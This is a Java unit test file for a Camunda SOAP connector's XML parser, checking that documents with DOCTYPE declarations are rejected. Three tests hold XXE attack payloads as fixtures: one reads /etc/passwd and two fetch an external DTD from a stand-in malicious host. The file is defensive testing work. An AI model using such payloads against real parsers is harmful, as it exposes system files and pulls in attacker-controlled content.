/*
 * Copyright Camunda Services GmbH and/or licensed to Camunda Services GmbH
 * under one or more contributor license agreements. Licensed under a proprietary license.
 * See the License.txt file for more information. You may not use this file
 * except in compliance with the proprietary license.
 */
package io.camunda.connectors.soap.xml;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;

public class XmlUtilitiesTest {

  @Test
  void shouldParseValidXmlWithoutDoctype() {
    // Given: A valid XML string without DOCTYPE
    String validXml = "<?xml version=\"1.0\"?><root><element>value</element></root>";

    // When: Parsing the XML
    Document document = XmlUtilities.xmlStringToDocument(validXml);

    // Then: The document should be parsed successfully
    assertThat(document).isNotNull();
    assertThat(document.getDocumentElement().getNodeName()).isEqualTo("root");
    assertThat(document.getElementsByTagName("element").item(0).getTextContent())
        .isEqualTo("value");
  }

  @Test
  void shouldRejectXmlWithDoctype() {
    // Given: An XML string with DOCTYPE declaration
    String xmlWithDoctype =
        "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE root ["
            + "  <!ELEMENT root ANY>"
            + "]>"
            + "<root>test</root>";

    // When/Then: Parsing should fail with a RuntimeException
    assertThatThrownBy(() -> XmlUtilities.xmlStringToDocument(xmlWithDoctype))
        .isInstanceOf(RuntimeException.class)
        .hasMessageContaining("DOCTYPE");
  }

  @Test
  void shouldRejectXmlWithExternalEntityDeclaration() {
    // Given: An XXE attack payload with external entity
    String xxePayload =
        "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE root ["
            + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
            + "]>"
            + "<root>&xxe;</root>";

    // When/Then: Parsing should fail with a RuntimeException
    assertThatThrownBy(() -> XmlUtilities.xmlStringToDocument(xxePayload))
        .isInstanceOf(RuntimeException.class)
        .hasMessageContaining("DOCTYPE");
  }

  @Test
  void shouldRejectXmlWithParameterEntity() {
    // Given: An XXE attack payload with parameter entity
    String xxePayload =
        "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE root ["
            + "  <!ENTITY % dtd SYSTEM \"http://malicious.example.com/evil.dtd\">"
            + "  %dtd;"
            + "]>"
            + "<root>test</root>";

    // When/Then: Parsing should fail with a RuntimeException
    assertThatThrownBy(() -> XmlUtilities.xmlStringToDocument(xxePayload))
        .isInstanceOf(RuntimeException.class)
        .hasMessageContaining("DOCTYPE");
  }

  @Test
  void shouldRejectXmlWithExternalDtd() {
    // Given: An XXE attack payload referencing external DTD
    String xxePayload =
        "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE root SYSTEM \"http://malicious.example.com/evil.dtd\">"
            + "<root>test</root>";

    // When/Then: Parsing should fail with a RuntimeException
    assertThatThrownBy(() -> XmlUtilities.xmlStringToDocument(xxePayload))
        .isInstanceOf(RuntimeException.class)
        .hasMessageContaining("DOCTYPE");
  }

  @Test
  void shouldParseXmlWithNamespaces() {
    // Given: A valid XML with namespaces
    String xmlWithNamespaces =
        "<?xml version=\"1.0\"?>"
            + "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">"
            + "  <soap:Body>"
            + "    <test>value</test>"
            + "  </soap:Body>"
            + "</soap:Envelope>";

    // When: Parsing the XML
    Document document = XmlUtilities.xmlStringToDocument(xmlWithNamespaces);

    // Then: The document should be parsed successfully
    assertThat(document).isNotNull();
    assertThat(document.getDocumentElement().getLocalName()).isEqualTo("Envelope");
    assertThat(document.getDocumentElement().getNamespaceURI())
        .isEqualTo("http://schemas.xmlsoap.org/soap/envelope/");
  }

  @Test
  void shouldParseXmlWithSpecialCharacters() {
    // Given: A valid XML with special characters (properly escaped)
    String xmlWithSpecialChars =
        "<?xml version=\"1.0\"?>"
            + "<root>"
            + "  <element>Value with &lt;special&gt; &amp; characters</element>"
            + "</root>";

    // When: Parsing the XML
    Document document = XmlUtilities.xmlStringToDocument(xmlWithSpecialChars);

    // Then: The document should be parsed successfully
    assertThat(document).isNotNull();
    assertThat(document.getElementsByTagName("element").item(0).getTextContent())
        .isEqualTo("Value with <special> & characters");
  }
}
